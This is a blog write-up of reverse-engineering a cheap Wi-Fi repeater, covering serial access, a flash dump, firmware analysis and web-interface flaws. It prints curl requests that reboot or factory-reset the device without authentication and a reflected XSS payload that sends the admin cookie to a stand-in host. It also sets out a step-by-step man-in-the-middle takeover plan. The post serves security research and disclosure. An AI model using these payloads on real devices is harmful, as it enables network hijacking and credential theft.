Teardown & Pwnage: Hacking a $5 Wi-Fi Repeater

May 18, 2026
##ReverseEngineering
##HardwareHacking
##MIPS
##EmbeddedSystems

I - Beyond the Basics: The Hardware Profile

Well if you follow those blog posts or know me u know I can’t resist cheap hardware; old? obsolete? naah this time brand new. I found a generic wall-plug wi-fi repeater for 5$ so of course I had to buy 2… Why 2? Why Not?

Under the hood, it’s powered by a MediaTek MT7628KN System-on-Chip (MIPS32 24KEc core at 575 MHz). The system RAM is an 8 MB DDR1 module permanently baked inside the CPU package, and it uses a Macronix MX-12G 4 MB SPI flash chip for non-volatile storage.

It’s the perfect target for the WNH initiative — cheap, obscure, and practically begging to be reverse-engineered.

II - Hunting the UART: Multimeters and Datasheets

Before you can pwn a system, you have to find a way to talk to it. Looking at the bare PCB, I spotted a suspicious unpopulated 3-pin header. In embedded systems, this is almost always the UART serial interface. But guessing the pinout is a great way to fry your USB-to-TTL adapter. We needed to be certain.

» Step 1: Finding True Ground
The easiest anchor point on any board is Ground (GND). Instead of guessing, I pulled up the datasheet for the Macronix MX-12G SPI flash chip. The datasheet mapped out exactly which leg of the physical chip was tied to GND.

I grabbed my multimeter, set it to continuity mode (the one that beeps), put the black probe on the flash chip’s GND leg, and touched the red probe to the 3-pin header.
Probe Pin 1… BEEP.
Pin 1 was our true digital ground.

» Step 2: Identifying TX and RX
Next, I needed to figure out which pin was Transmit (TX) and which was Receive (RX). I powered on the router, switched the multimeter to DC Voltage mode, and kept the black probe anchored on our newly found Pin 1 (GND).

  • Probing Pin 2: The multimeter read a steady 3.24V while idle, with tiny fluctuations right as the board booted up. In serial logic, the TX line is held “Active High” (at voltage) when idle and pulls to 0V to send data. The fluctuations were the board blindly broadcasting its boot logs into the void. Pin 2 is TX.
  • Probing Pin 3: The multimeter read a flat 0V. The RX line waits passively for incoming signals. Pin 3 is RX.

So the final pinout for the debug header is:

Pin Role Idle Voltage
1 GND 0V
2 TX 3.24V
3 RX 0V

» Step 3: Baud Rate Roulette
I hooked up my serial adapter (TX to RX, RX to TX, GND to GND) and fired up Minicom. But serial communication requires both sides to speak at the exact same speed.

I started with the industry standard: 115200 baud. The screen filled with alien garbage characters. Okay, too fast.
I dropped it to 9600 baud. Dead silence.
I tried 38400. More garbage.
Finally, I set it to 57600 baud (8N1).

Suddenly, pristine boot logs streamed across the terminal. Hooking up the serial adapter dropped me straight into an unlocked Ralink U-Boot (Version 4.3.0.0, built December 13 2017) console by simply sending the character 4 during autoboot. We were in.

III - The 58-Minute Flash Dump (Trial, Error, and Jackpots)

First rule of hardware hacking: back up the flash memory. I dropped into the MT7628 # prompt and tried to read the flash into memory. It didn’t go well.

MT7628 # spi read 0 400000
malloc error

I didn’t have enough memory. So, I tried reading in smaller chunks.

MT7628 # spi read 0 40000
malloc error

Still the same error. I downgraded it all the way to a single byte, and then 256 bytes (hex 100), just to see if it worked:

MT7628 # spi read 0 1
read len: 1
ff 

MT7628 # spi read 0 100
read len: 256
ff 0 0 10 0 0 0 0 fd 0 0 10 0 0 0 0 d 3 0 10 0 0 0 0 b 3 0 10 0 0 0 0 9 3 0 10 0 0 0 0 7 3 0 10 0 0 0 0 5

It worked, but reading the whole 4MB in 256-byte chunks would take forever. After looking into the architecture, I found that MediaTek’s SPI flash is usually automatically memory-mapped directly into the CPU’s uncached virtual memory segment (kseg1) starting at physical address 0xBC000000. Let’s compare that address to our spi read:

MT7628 # md.b BC000000 20
bc000000: ff 00 00 10 00 00 00 00 fd 00 00 10 00 00 00 00    ................
bc000010: 0d 03 00 10 00 00 00 00 0b 03 00 10 00 00 00 00    ................

=»> JACKPOT.

Same bytes, no chunking limit. I logged the full UART data stream into a file using minicom’s built-in capture. 58 minutes later (58:00.41 to be exact hhhhh), I had a 20MB text file. I cleared out the junk and converted the hex back to binary:

awk -F: '/^[0-9a-fA-F]{8}:/ {print substr($2, 1, 48)}' raw_flash_steam.txt | xxd -r -p > factory_backup.bin

➜ stat -c %s factory_backup.bin
4194304

Exactly 4,194,304 bytes — a perfect 4MB factory_backup.bin. We have the full flash.

IV - The “Linux” Lie & Binwalk Dissection

Running binwalk on the backup immediately revealed something interesting:

DECIMAL       HEXADECIMAL     DESCRIPTION
88976         0x15B90         U-Boot version string, "U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)"
89687         0x15E57         HTML document header
203648        0x31B80         eCos RTOS string reference: "ECOSAPClient"
327680        0x50000         uImage header, ... OS: Linux, CPU: MIPS, image name: "zxrouter"
337024        0x52480         LZMA compressed data, ...
2186128       0x215B90        U-Boot version string, "U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)"
2300800       0x231B80        eCos RTOS string reference: "ECOSAPClient"
2424832       0x250000        uImage header, ... OS: Linux, CPU: MIPS, image name: "zxrouter"
2434176       0x252480        LZMA compressed data, ...

Two things stand out immediately. First, the entire flash layout is mirrored perfectly — the same structure repeats twice. This is a Dual-Image Failover layout (A/B partition scheme): if one image is corrupted, the device boots from the other. Second, notice how the uImage header proudly declares OS: Linux… but also references ECOSAPClient in the same binary. That contradiction was worth pulling on.

Running strings on the binary gave away more than expected. The default SSID (BFROS_WIFI), the hardcoded web management username (admin), the U-Boot network config — and this gem buried in the environment variables:

bootcmd=tftp
bootdelay=5
baudrate=57600
ethaddr="00:AA:BB:CC:DD:10"
ipaddr=192.168.11.8
serverip=192.168.11.11
...
AAAAAA
BBBBBB
admin
BFROS_WIFI
admin

That MAC address — 00:AA:BB:CC:DD:10 — is a fake placeholder that ships in the firmware defaults. Every device that never gets a proper MAC assigned is broadcasting with a non-unique, fully predictable hardware address. Fingerprinting these on any network is trivial.

And AAAAAA, BBBBBB sitting there next to admin? Developer test placeholders that shipped straight to production. Twenty years of firmware quality right there.

Now, back to the “Linux” claim. I tried to extract the root filesystem from the LZMA blob at offset 0x52480:

> dd if=factory_backup.bin of=filesystem.lzma bs=1 skip=337024 count=1762176
> lzma -d filesystem.lzma
lzma: filesystem.lzma: Compressed data is corrupt

Legacy MediaTek SDKs frequently used non-standard LZMA headers, so I used binwalk -e to force the extraction, which pulled out a chunk called 52480. The file command thought it was “Targa image data”, but running binwalk again on 52480 revealed the truth:

116           0x74            eCos kernel exception handler, architecture: MIPSEL
1846269       0x1C2BFD        eCos RTOS string reference: "ecos/rt_profile.c"
1864136       0x1C71C8        eCos RTOS string reference: "ecos_start()"

This thing doesn’t even run Linux hhhhhhh. The OS: Linux tag in the uImage header is a lie they told U-Boot so it would boot the image without complaining — U-Boot doesn’t verify the OS type, it just reads the field and moves on. The actual OS is eCos RTOS, a real-time embedded operating system last seriously updated around 2009.

Because eCos compiles the OS, network stack, and application layer into a single flat binary executable, there is no /bin, no /etc, no shell in the traditional sense. Everything runs bare-metal as one monolithic blob. The copyright string found in the image: Copyright (c) 2006 Klaus Hartl. 20 years ago.

V - The Live eCos Shell & NVRAM Plaintext

While messing around with the UART connection, I noticed that pressing 4 isn’t even the only way in. If you just hit Enter at the boot prompt — or do nothing at all and let it time out — you drop straight into a live debugging shell from eCos itself:

CMD>cd os
OS>ls
thread      mem         spi         reg         cpuload     cpubusy

I ran prof show and dumped the entire configuration table. It returned over 300 lines of configuration defaults. Here is exactly where the security completely falls apart:

SYS_ADMPASS=admin
SYS_USERS=admin
WLN_WPAPSK1=88888888
L2T_PASS=7628Kap
FW_EN=0

The passwords sit in plain text inside flash memory. No hashing, no salting, nothing. And notice FW_EN=0 — the firewall is completely disabled out of the box.

To be clear about the layers here: the browser stores a Base64-encoded copy of the password in a cookie so the admin panel session persists. The hardware itself stores the actual plaintext password physically written to the flash chip. Both are fully readable by anyone with 5 minutes and basic tools.

VI - Decimating the Web Layer

To analyze the web interface, I used dd to carve the web assets out of the 52480 chunk and grep to pull the JavaScript logic:

strings web_assets.dat | grep -E "(function|var|input|action)" > web_logic.txt

Here are the catastrophic vulnerabilities I found:

Vulnerability 1: Hardcoded Defaults in HTML

They literally hardcoded the default credentials right into the login form inputs in the HTML source:

<input type="hidden" maxlength="16" name="username" value="admin" />
<input type="password" id="pcPassword" name="pcPassword" maxlength="16" value="admin">

The password field ships pre-filled with admin. You don’t even have to type anything.

Vulnerability 2: Fake “Encryption” & Cookie Theft

When you log in, the JavaScript does this:

var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
document.cookie = "Authorization="+escape(auth)+";path=/";
f.submit();

Base64 is encoding, not encryption. The session “token” is literally just admin:88888888 encoded to YWRtaW46ODg4ODg4ODg=. Anyone who intercepts this cookie can decode it instantly:

echo "YWRtaW46ODg4ODg4ODg=" | base64 -d
# admin:88888888

Making this worse: the cookie has no HttpOnly flag. That means JavaScript running in the page can read it freely — which becomes critical in Vulnerability 4.

Vulnerability 3: Unauthenticated RCE & The Broken Parser

The UI executes hardware operations via hidden parameters sent to do_cmd.htm. The official frontend uses a form like this:

<form name="frmSetup">
    <input type="hidden" name="FLG" value="1">
    <input type="hidden" name="CMD" value="SYS_CONF">
    <input type="hidden" name="CCMD" value="100">
</form>

There is zero authentication check on this endpoint. I tested it with curl:

curl -v "http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&CCMD=101"

This bypassed authentication entirely and forced a hard hardware reboot. The UART confirmed it immediately:

******************************
Software System Reset Occurred
******************************
U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)
Board: Ralink APSoC DRAM:   8 MB
...
##### The CPU freq = 575 MHZ ####

Sending CCMD=1&FLG=1 triggers a full unauthenticated factory wipe — resets all 319 configuration items back to admin/admin and 88888888:

curl -v "http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&CCMD=1&FLG=1"
# UART: Software System Reset Occurred

Interestingly, CCMD=10 (note: 0&0 is what the official frontend uses for a normal restart) triggers a softer reset — it re-parses and reloads 319 config items and restarts dnsMasq without a full hardware reboot:

CFG_commit: 319 update!
CFG_save: write 4248 bytes to flash
dnsMasqstop
dnsMasqstart

That’s stealthy — no reboot, the network barely hiccups. Except it became unpredictable and started doing full resets anyway. Why?

Because the parser in the C backend only checks if the first character of CCMD is 1. Sending 1, 10, 100, 101, or 1111111111111111 all result in a reset. The official frontend uses CCMD=0 for a clean restart — anything starting with 1 is treated as a reset command regardless of what follows it.

This also works via zrlogin.cn — a hardcoded captive portal domain baked into the firmware — which makes it reachable from outside the local subnet via DNS tricks:

curl -v "http://zrlogin.cn/do_cmd.htm?CMD=SYS_CONF&CCMD=1&FLG=1"
# works just as well :)

Vulnerability 4: Reflected XSS → Cookie Theft Kill Chain

The router uses a GO parameter to redirect users after actions. By injecting a payload, I broke out of their JavaScript string context:

http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&GO=';alert('hacked')//

The router renders this in the page:

var go='';alert('HACKED');//';

Alert box pops perfectly. But the real attack isn’t an alert box. Because the Authorization cookie has no HttpOnly flag (Vulnerability 2), an attacker replaces the alert with a cookie exfiltration payload:

'; window.location='http://evil-hacker.com/steal?data=' + document.cookie; //

If the router admin clicks that link, the router executes the XSS, grabs the Authorization cookie straight from the browser’s memory, and silently sends it to the attacker’s server. The attacker Base64-decodes it and has the admin password. Full router compromise from a single malicious link.

VII - The Real-World Impact: The Ultimate MitM Hijack

One important thing before we get into this: everything documented in this post — the UART bringup, the flash dump, the firmware analysis, all four vulnerabilities — happened in two days. This is not an exhaustive audit. I didn’t map every CCMD value, didn’t touch the GPIO pins, didn’t dig deep into the network stack. And yet, in 48 hours of casual poking, this is what fell out. That should tell you something about the state of this firmware.

You might think: is this really that serious if the attacker needs to be on the local network?

They don’t. Because of the CSRF vulnerability and the unauthenticated do_cmd.htm endpoint, any attack that doesn’t require a response from the router can be triggered via social engineering. I don’t need the admin to click anything specific. I just need anyone — an employee, a student in a dorm, a customer at a cafe — to visit a webpage, click on a link, or load a page with a hidden image tag while connected to the Wi-Fi. The browser fires the request, the router blindly accepts it, network drops.

If I am nearby, the kill chain is worse:

  1. Send the unauthenticated factory reset (CCMD=1&FLG=1) to wipe the owner’s settings and restore the default admin password.
  2. Log into the web panel using the restored defaults.
  3. Reconfigure the repeater to use my cellular hotspot as its upstream connection instead of the victim’s actual router.

Anyone who connects to this repeater thinking they’re safe at home or in a café is now routing 100% of their traffic through me. DNS redirects to fake captive portals, packet sniffing, credential harvesting — all of it. A $5 piece of plastic becomes a weaponized Man-in-the-Middle rogue access point in under 30 seconds.

VIII - The White-Label Epidemic & Final Thoughts

Here is the scariest part: you might own this exact firmware and not even know it. These are generic, white-labeled repeaters. Dozens of obscure “brands” slap their logo on this exact board, flash this exact software, and sell it.

The copyright inside this firmware says 2006. The U-Boot was compiled December 13, 2017. And yet I am still seeing these brand new in boxes being sold in shops and on Facebook Marketplace all across Morocco in 2026.

The MAC address placeholder 00:AA:BB:CC:DD:10 and credential placeholders AAAAAA, BBBBBB that shipped to production tell you everything you need to know about the care that went into this. Nobody audited anything. They copied firmware from a reference design, slapped a logo on it, and shipped it.

The lesson is simple: don’t just buy the cheap thing because it “does the job.” It does the job, but it does it so poorly and insecurely that you are paying for it with your entire network’s safety.

IX - What’s Next

Of course this isn’t the end. Two days in and we already have four unauth vulnerabilities, plaintext credentials in flash, a disabled firewall, and a broken parser — and I’ve barely scratched the surface. I didn’t map all the CCMD values, didn’t look at the GPIO pins, didn’t touch the network stack beyond what the web UI exposed. There’s a lot more to find.

Next up: mapping the GPIOs, and maybe porting a minimal Linux image to it or writing a bare-metal piece of code that runs directly on the MIPS core — just to see if it’s doable. And if the board survives all of that, the plan is to repurpose it into something actually useful: either a wireless debugger for my other projects, or a cheap UART-to-WiFi bridge that gives my other boards network connectivity over serial. The possibilities are honestly endless for $5.
